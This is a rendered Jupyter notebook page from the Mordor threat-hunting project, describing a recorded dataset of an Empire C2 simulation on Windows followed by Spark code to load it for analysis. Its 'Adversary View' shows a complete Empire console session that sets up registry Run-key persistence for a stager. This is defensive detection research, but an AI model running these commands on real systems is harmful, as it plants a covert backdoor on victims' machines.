---
redirect_from:
  - "/notebooks/small/windows/03-persistence/sd-190319023812"
interact_link: content/notebooks/small/windows/03_persistence/SD-190319023812.ipynb
kernel_name: 
kernel_path: content/notebooks/small/windows/03_persistence
has_widgets: false
title: |-
  Empire Userland Registry
pagenum: 20
prev_page:
  url: /notebooks/small/windows/03_persistence/persistence.html
next_page:
  url: /notebooks/small/windows/03_persistence/SD-190518184306.html
suffix: .ipynb
search: false registry persistence default userland script powershell run empire windows name none agent software microsoft currentversion module key proxy request store location true listener mordor description hkcu fdamgy id com data dataset mattifestation stager specified cleanup trigger code simulation github blob psm master file tasked info invoke needsadmin opsecsafe language minlanguageversion background outputextension authors harmjy enigmax persist via easy detection removal rating comments powersploit pe rsistence options required value proxycreds credentials domain username password eventlogid application event log under eventid needs unique rare extfile external payload instead switch any adspath alternate stream keyname updater regpath d last element ebug useragent

comment: "***PROGRAMMATICALLY GENERATED, DO NOT EDIT. SEE ORIGINAL FILES IN /content***"
---

    <main class="jupyter-page">
    <div id="page-info"><div id="page-title">Empire Userland Registry</div>
</div>
    <div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Metadata">Metadata<a class="anchor-link" href="#Metadata"> </a></h2>
</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<table>
<thead><tr>
<th style="text-align:left"></th>
<th style="text-align:left"></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">id</td>
<td style="text-align:left">SD-190319023812</td>
</tr>
<tr>
<td style="text-align:left">author</td>
<td style="text-align:left">Roberto Rodriguez @Cyb3rWard0g</td>
</tr>
<tr>
<td style="text-align:left">creation date</td>
<td style="text-align:left">19/03/19</td>
</tr>
<tr>
<td style="text-align:left">platform</td>
<td style="text-align:left">Windows</td>
</tr>
<tr>
<td style="text-align:left">Mordor Environment</td>
<td style="text-align:left">shire</td>
</tr>
<tr>
<td style="text-align:left">Simulation Type</td>
<td style="text-align:left">C2</td>
</tr>
<tr>
<td style="text-align:left">Simulation Tool</td>
<td style="text-align:left">Empire</td>
</tr>
<tr>
<td style="text-align:left">Simulation Script</td>
<td style="text-align:left"><a href="https://github.com/EmpireProject/Empire/blob/dev/data/module_source/persistence/Persistence.psm1">https://github.com/EmpireProject/Empire/blob/dev/data/module_source/persistence/Persistence.psm1</a></td>
</tr>
<tr>
<td style="text-align:left">Mordor Dataset</td>
<td style="text-align:left"><a href="https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/persistence/empire_userland_registry.tar.gz">https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/persistence/empire_userland_registry.tar.gz</a></td>
</tr>
</tbody>
</table>

</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Dataset-Description">Dataset Description<a class="anchor-link" href="#Dataset-Description"> </a></h2><p>This dataset represents adversaries modifying HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry keys for persistence.</p>

</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Adversary-View">Adversary View<a class="anchor-link" href="#Adversary-View"> </a></h2>
<pre><code>usemodule persistence/userland/registry
(Empire: powershell/persistence/userland/registry) &gt; info

              Name: Invoke-Registry
            Module: powershell/persistence/userland/registry
        NeedsAdmin: False
        OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: False
  OutputExtension: None

Authors:
  @mattifestation
  @harmj0y
  @enigma0x3

Description:
  Persist a stager (or script) via the
  HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry
  key. This has an easy detection/removal rating.

Comments:
  https://github.com/mattifestation/PowerSploit/blob/master/Pe
  rsistence/Persistence.psm1

Options:

  Name       Required    Value                     Description
  ----       --------    -------                   -----------
  ProxyCreds False       default                   Proxy credentials                       
                                                  ([domain\]username:password) to use for 
                                                  request (default, none, or other).      
  EventLogID False                                 Store the script in the Application     
                                                  event log under the specified EventID.  
                                                  The ID needs to be unique/rare!         
  ExtFile    False                                 Use an external file for the payload    
                                                  instead of a stager.                    
  Cleanup    False                                 Switch. Cleanup the trigger and any     
                                                  script from specified location.         
  ADSPath    False                                 Alternate-data-stream location to store 
                                                  the script code.                        
  Agent      True        FD6A3MGY                  Agent to run module on.                 
  Listener   True                                  Listener to use.                        
  KeyName    True        Updater                   Key name for the run trigger.           
  RegPath    False       HKCU:Software\Microsoft\  Registry location to store the script   
                        Windows\CurrentVersion\D  code. Last element is the key name.     
                        ebug                    
  Proxy      False       default                   Proxy to use for request (default, none,
                                                  or other).                              
  UserAgent  False       default                   User-agent string to use for the staging
                                                  request (default, none, or other).      

(Empire: powershell/persistence/userland/registry) &gt; set Listener https
(Empire: powershell/persistence/userland/registry) &gt; info

              Name: Invoke-Registry
            Module: powershell/persistence/userland/registry
        NeedsAdmin: False
        OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: False
  OutputExtension: None

Authors:
  @mattifestation
  @harmj0y
  @enigma0x3

Description:
  Persist a stager (or script) via the
  HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry
  key. This has an easy detection/removal rating.

Comments:
  https://github.com/mattifestation/PowerSploit/blob/master/Pe
  rsistence/Persistence.psm1

Options:

  Name       Required    Value                     Description
  ----       --------    -------                   -----------
  ProxyCreds False       default                   Proxy credentials                       
                                                  ([domain\]username:password) to use for 
                                                  request (default, none, or other).      
  EventLogID False                                 Store the script in the Application     
                                                  event log under the specified EventID.  
                                                  The ID needs to be unique/rare!         
  ExtFile    False                                 Use an external file for the payload    
                                                  instead of a stager.                    
  Cleanup    False                                 Switch. Cleanup the trigger and any     
                                                  script from specified location.         
  ADSPath    False                                 Alternate-data-stream location to store 
                                                  the script code.                        
  Agent      True        FD6A3MGY                  Agent to run module on.                 
  Listener   True        https                     Listener to use.                        
  KeyName    True        Updater                   Key name for the run trigger.           
  RegPath    False       HKCU:Software\Microsoft\  Registry location to store the script   
                        Windows\CurrentVersion\D  code. Last element is the key name.     
                        ebug                    
  Proxy      False       default                   Proxy to use for request (default, none,
                                                  or other).                              
  UserAgent  False       default                   User-agent string to use for the staging
                                                  request (default, none, or other).      

(Empire: powershell/persistence/userland/registry) &gt; execute
[&gt;] Module is not opsec safe, run? [y/N] y
[*] Tasked FD6A3MGY to run TASK_CMD_WAIT
[*] Agent FD6A3MGY tasked with task ID 9
[*] Tasked agent FD6A3MGY to run module powershell/persistence/userland/registry
(Empire: powershell/persistence/userland/registry) &gt; Registry persistence established using listener https stored in HKCU:Software\Microsoft\Windows\CurrentVersion\Debug.

(Empire: powershell/persistence/userland/registry) &gt;</code></pre>

</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Explore-Mordor-Dataset">Explore Mordor Dataset<a class="anchor-link" href="#Explore-Mordor-Dataset"> </a></h2>
</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h3 id="Initialize-Analytics-Engine">Initialize Analytics Engine<a class="anchor-link" href="#Initialize-Analytics-Engine"> </a></h3>
</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">from</span> <span class="nn">openhunt.mordorutils</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">spark</span> <span class="o">=</span> <span class="n">get_spark</span><span class="p">()</span>
</pre></div>

    </div>
</div>
</div>

</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h3 id="Download-&amp;-Process-Mordor-File">Download &amp; Process Mordor File<a class="anchor-link" href="#Download-&amp;-Process-Mordor-File"> </a></h3>
</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/persistence/empire_userland_registry.tar.gz&quot;</span>
<span class="n">registerMordorSQLTable</span><span class="p">(</span><span class="n">spark</span><span class="p">,</span> <span class="n">mordor_file</span><span class="p">,</span> <span class="s2">&quot;mordorTable&quot;</span><span class="p">)</span>
</pre></div>

    </div>
</div>
</div>

</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h3 id="Get-to-know-your-data">Get to know your data<a class="anchor-link" href="#Get-to-know-your-data"> </a></h3>
</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
    <span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT channel, COUNT(1)</span>
<span class="sd">FROM mordorTable</span>
<span class="sd">GROUP BY channel</span>
<span class="sd">    &#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="kc">False</span><span class="p">)</span>
        
</pre></div>

    </div>
</div>
</div>

</div>
</div>

 


    </main>
    